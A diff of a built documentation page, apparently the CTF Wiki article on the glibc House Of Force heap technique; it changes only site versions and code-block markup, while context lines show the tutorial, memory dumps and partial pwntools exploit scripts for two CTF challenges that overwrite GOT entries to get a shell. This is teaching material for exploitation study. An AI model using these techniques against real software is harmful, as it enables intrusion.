@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4763,7 +4763,7 @@ However, most of the methods proposed in The Malloc Maleficarum have not worked 
 </ol>
 <p>The reason that House Of Force is generated is that glibc handles the top chunk. According to the knowledge of the previous heap data structure, we know that when all the free blocks are unable to meet the requirements, the heap will be split from the top chunk. The corresponding size is used as the space for the heap block.</p>
 <p>So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want, which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified.
-<div class="codehilite"><pre><span></span>// Get the current top chunk and calculate its corresponding size
+<div class="codehilite"><pre><span></span><code>// Get the current top chunk and calculate its corresponding size
 victim = off-&amp;gt; top;
 size   = chunksize(victim);
 
@@ -4792,13 +4792,13 @@ check_malloced_chunk (off, victim, nb);
     return p;
 
 }
-</pre></div></p>
+</code></pre></div></p>
 <p>However, if you can tamper with size to a large value, you can easily pass this verification, which is what we said earlier that you need a vulnerability that can control the top chunk size field.</p>
-<div class="codehilite"><pre><span></span>(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)
+</code></pre></div>
 
 <p>The general practice is to change the size of the top chunk to -1, because the size is converted to an unsigned number when comparing, so -1 is the largest number of unsigned longs, so you can pass the verification anyway.</p>
-<div class="codehilite"><pre><span></span>remainder      = chunk_at_offset(victim, nb);
+<div class="codehilite"><pre><span></span><code>remainder      = chunk_at_offset(victim, nb);
 
 off-&amp;gt; top = remainder;
 
@@ -4806,22 +4806,22 @@ off-&amp;gt; top = remainder;
 /* Treat space at ptr + offset as a chunk */
 
 #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
-</pre></div>
+</code></pre></div>
 
 <p>After that, the top pointer will be updated, and the next heap block will be allocated to this location. The user only needs to control the pointer to write arbitrary values (write-anything-anywhere).</p>
 <p><strong> At the same time, we need to pay attention to the topchunk size will also be updated, the update method is as follows </strong></p>
-<div class="codehilite"><pre><span></span><span class="n">victim</span> <span class="o">=</span> <span class="n">off</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">top</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="n">victim</span> <span class="o">=</span> <span class="n">off</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">top</span><span class="p">;</span>
 <span class="n">size</span>   <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
 
 <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
 
 <span class="n">set_head</span><span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>So, if we want to allocate chunks of size x at the specified location next time, we need to make sure that the remainder_size is not less than x+ MINSIZE.</p>
 <h2 id="simple-example-1">Simple example 1<a class="headerlink" href="#simple-example-1" title="Permanent link">&para;</a></h2>
 <p>After learning the principles of HOF, we use an example to illustrate the use of HOF. The goal of this example is to tamper with <code>malloc@got.plt</code> by HOF to implement the hijacking process.</p>
-<div class="codehilite"><pre><span></span>int main()
+<div class="codehilite"><pre><span></span><code>int main()
 
 {
 
@@ -4832,28 +4832,28 @@ ptr = (long *) (((long) ptr) +24);
 Malloc(-4120); // &amp;lt;=== reduce the top chunk pointer
 Malloc(0x10); // &amp;lt;=== allocate blocks to implement arbitrary address writes
 }
-</pre></div>
+</code></pre></div>
 
 <p>First, we allocate a block of size 0x10 bytes.</p>
-<div class="codehilite"><pre><span></span>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr
+<div class="codehilite"><pre><span></span><code>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr
 0x602010:   0x0000000000000000  0x0000000000000000
 
 0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
 
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <p>Then change the size of the top chunk to 0xffffffffffffffff 1⁄4 In the real problem, this step can be achieved through a vulnerability such as heap overflow.
 Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 directly.</p>
-<div class="codehilite"><pre><span></span>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr
+<div class="codehilite"><pre><span></span><code>0x602000: 0x0000000000000000 0x0000000000000021 &amp;lt;=== ptr
 0x602010:   0x0000000000000000  0x0000000000000000
 
 0x602020: 0x0000000000000000 0xffffffffffffffff &amp;lt;=== top chunk size field was changed
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <p>Notice the top chunk location at this point, and when we make the next allocation, we will change the position of the top chunk to where we want it.</p>
-<div class="codehilite"><pre><span></span>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000
+<div class="codehilite"><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000
 
 0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
 
@@ -4865,22 +4865,22 @@ Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 
 
 0x7ffff7dd1b70 &lt;main_arena+80&gt; : 0x0000000000000000 0x0000000000602020 &amp;lt;=== top chunk at this point everything is fine
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
-</pre></div>
+</code></pre></div>
 
 <p>Next we execute <code>malloc(-4120);</code>,-4120 is how to get it?
 First, we need to know the destination address to be written. Here, after I compile the program, 0x601020 is the address of <code>malloc@got.plt</code></p>
-<div class="codehilite"><pre><span></span>0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt
+</code></pre></div>
 
 <p>So we should point the top chunk to 0x601010 so that the next time we allocate the chunk, we can allocate the memory at <code>malloc@got.plt</code>.</p>
 <p>After clearing the address of the current top chunk, according to the previous description, the top chunk is located at 0x602020, so we can calculate the offset as follows</p>
 <p>0x601010-0x602020=-4112</p>
 <p>In addition, the size of the memory requested by the user becomes an unsigned integer once it enters the function of applying for memory.</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="o">*</span><span class="nf">__libc_malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">__libc_malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
+</code></pre></div>
 
 <p>If you want the size of the user input to go through the internal <code>checked_request2size</code>, you can get this size, ie</p>
-<div class="codehilite"><pre><span></span><span class="cm">/*</span>
+<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
 
 <span class="cm">   Check if a request is so large that it would wrap around zero when</span>
 
@@ -4925,12 +4925,12 @@ First, we need to know the destination address to be written. Here, after I comp
     <span class="p">}</span>                                                                          \
 
     <span class="p">(</span><span class="n">sz</span><span class="p">)</span> <span class="o">=</span> <span class="n">request2size</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>On the one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) test, that is, the value we pass to malloc is in the negative range, not greater than -2 * MINSIZE, which is generally acceptable.</p>
 <p>On the other hand, after satisfying the corresponding constraints, we need to make <code>request2size</code> exactly convert to the corresponding size, that is, we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK exactly -4112. First of all, it is clear that -4112 is chunk aligned, then we only need to subtract SIZE_SZ, MALLOC_ALIGN_MASK to get the corresponding value to be applied. In fact, we only need to reduce SIZE_SZ here, because the more reduced MALLOC_ALIGN_MASK will eventually be aligned. And <strong> If -4112 is not MALLOC_ALIGN, we need to reduce more. Of course, we&#39;d better make the chunks that are obtained after the allocation are also aligned, because when a chunk is released, an alignment check is performed. </strong></p>
 <p>So, after calling <code>malloc(-4120)</code>, we can observe that the top chunk is raised to the position we want.</p>
-<div class="codehilite"><pre><span></span>0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000
+<div class="codehilite"><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000
 
 0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
 
@@ -4942,19 +4942,19 @@ First, we need to know the destination address to be written. Here, after I comp
 
 0x7ffff7dd1b70 &lt;main_arena+80&gt; : 0x0000000000000000 0x0000000000601010 &amp;lt;=== It can be observed that the top chunk is raised
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
-</pre></div>
+</code></pre></div>
 
 <p>After that, our assigned block will appear at 0x601010+0x10, that is, 0x601020 can change the contents of the got table.</p>
 <p>However, it should be noted that while being elevated, the content near malloc@got will also be modified.</p>
-<div class="codehilite"><pre><span></span>    <span class="n">set_head</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
+<div class="codehilite"><pre><span></span><code>    <span class="n">set_head</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
 
 <span class="p">(</span><span class="n">av</span><span class="o">!</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">main_arena</span><span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span><span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="simple-example-2">Simple example 2<a class="headerlink" href="#simple-example-2" title="Permanent link">&para;</a></h2>
 <p>In the previous example, we demonstrated modifying the contents of the got table above it (lower address) by reducing the pointer of the top chunk by HOF.
 But HOF can actually make the top chunk pointer increase to modify the content in the high address space. We demonstrate this by using this example.</p>
-<div class="codehilite"><pre><span></span>int main()
+<div class="codehilite"><pre><span></span><code>int main()
 
 {
 
@@ -4966,11 +4966,11 @@ Malloc(140737345551056); &amp;lt;=== Increase the top chunk pointer
     malloc(0x10);
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>We can see that the program code is basically the same as the simple example 1, except that the size of the second malloc is different.
 This time our goal is malloc_hook, we know that malloc_hook is the value of the global variable in libc.so, first look at the memory layout</p>
-<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
+<div class="codehilite"><pre><span></span><code>Start              End                Offset             Perm Path
 
 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/t1
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/t1
@@ -5006,13 +5006,13 @@ This time our goal is malloc_hook, we know that malloc_hook is the value of the 
 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
 
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-</pre></div>
+</code></pre></div>
 
 <p>You can see that the base address of the heap is 0x602000, and the base address of libc is 0x7ffff7a0d000, so we need to expand the value of the top chunk pointer by HOF to implement the write to malloc_hook.
 First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 and takes the calculation.</p>
 <p>0x7ffff7dd1b00-0x602020-0x10=140737345551056</p>
 <p>After this malloc, we can observe that the address of the top chunk is raised to 0x00007ffff7dd1b00</p>
-<div class="codehilite"><pre><span></span>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000
+<div class="codehilite"><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000
 
 0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
 
@@ -5025,15 +5025,15 @@ First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 an
 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk
 
 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78
-</pre></div>
+</code></pre></div>
 
 <p>After that, we can control the __malloc_hook value at 0x7ffff7dd1b10 as long as we allocate it again.</p>
-<div class="codehilite"><pre><span></span>rax = 0x00007ffff7dd1b10
+<div class="codehilite"><pre><span></span><code>rax = 0x00007ffff7dd1b10
 
 
 0x400562 &lt;main+60&gt; mov, 0x10
 0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;
-</pre></div>
+</code></pre></div>
 
 <h2 id="_1">小述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <p>In this section, we explain the principle of House Of Force and give a simple example of two uses. By observing these two simple examples, we will find that the utilization requirements of HOF are still quite demanding.</p>
@@ -5047,7 +5047,7 @@ First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 an
 <p>[Topic link] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11</a>)</p>
 <p>Here, we mainly modify its magic function to</p>
 <h3 id="basic-information">Basic Information<a class="headerlink" href="#basic-information" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  hitcontraning_lab11 git:<span class="o">(</span>master<span class="o">)</span> file bamboobox     
+<div class="codehilite"><pre><span></span><code>➜  hitcontraning_lab11 git:<span class="o">(</span>master<span class="o">)</span> file bamboobox     
 
 bamboobox: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
 
@@ -5064,7 +5064,7 @@ bamboobox: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>The program is a 64-bit dynamic linker.</p>
 <h3 id="basic-skills">basic skills<a class="headerlink" href="#basic-skills" title="Permanent link">&para;</a></h3>
@@ -5086,7 +5086,7 @@ bamboobox: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 </ol>
 <p><strong> It should be noted here that when triggering the top chunk to move to the specified location, the size should be appropriate to set the new top chunk size so that the detection of the next top chunk can be bypassed. </strong></p>
 <p>Exp is as follows</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
@@ -5197,13 +5197,13 @@ additem<span class="o">(</span>0x10, p64<span class="o">(</span>magic<span class
 print r.recv<span class="o">()</span>
 
 r.interactive<span class="o">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Of course, this problem can also be done using the unlink method.</p>
 <h2 id="2016-bctf-bcloud">2016 BCTF bcloud<a class="headerlink" href="#2016-bctf-bcloud" title="Permanent link">&para;</a></h2>
 <p>[Topic link] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud</a>)</p>
 <h3 id="basic-information_1">Basic Information<a class="headerlink" href="#basic-information_1" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  2016_bctf_bcloud git:<span class="o">(</span>master<span class="o">)</span> file bcloud   
+<div class="codehilite"><pre><span></span><code>➜  2016_bctf_bcloud git:<span class="o">(</span>master<span class="o">)</span> file bcloud   
 
 bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">80386</span>, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
 
@@ -5220,7 +5220,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that this is a dynamically linked 32-bit program that primarily enables Canary protection and NX protection.</p>
 <h3 id="basic-skills_1">basic skills<a class="headerlink" href="#basic-skills_1" title="Permanent link">&para;</a></h3>
@@ -5234,7 +5234,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
 </ol>
 <p>However, no flaws were found in these five functions, and the program was revisited. As a result, it was found that the program was vulnerable when it was initialized. .</p>
 <p>Initial name</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">init_name</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">init_name</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5264,11 +5264,11 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
   <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>Here, if the name read by the program is 64 characters, then when the program outputs the corresponding string using the info function, the corresponding tmp pointer content is output, that is, <strong> leaks the heap address</strong>. .</p>
 <p>Vulnerabilities when initializing organization and org</p>
-<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">init_org_host</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">init_org_host</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5309,7 +5309,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
   <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>When reading into an organization, given 64 bytes, the lower address of v2 is overwritten. At the same time, we can know that v2 is a chunk adjacent to the top chunk, and v2 is just adjacent to org. Since 32-bit programs are generally used in 32-bit programs, the content stored in v2 is almost To a large extent, it is not <code>\x00</code> , so when you execute the strcpy function to copy content to v2, it is likely to overwrite the top chunk. This is where the vulnerability lies.</p>
 <h3 id="use_1">Use<a class="headerlink" href="#use_1" title="Permanent link">&para;</a></h3>
@@ -5322,7 +5322,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
 <li>Modify another atoi got item to the system address again to get the shell.</li>
 </ol>
 <p>The specific script is as follows</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
 
@@ -5492,7 +5492,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
 
     <span class="n">exp</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="topic">topic<a class="headerlink" href="#topic" title="Permanent link">&para;</a></h2>
 <ul>
@@ -5563,7 +5563,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5578,7 +5578,7 @@ bcloud: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
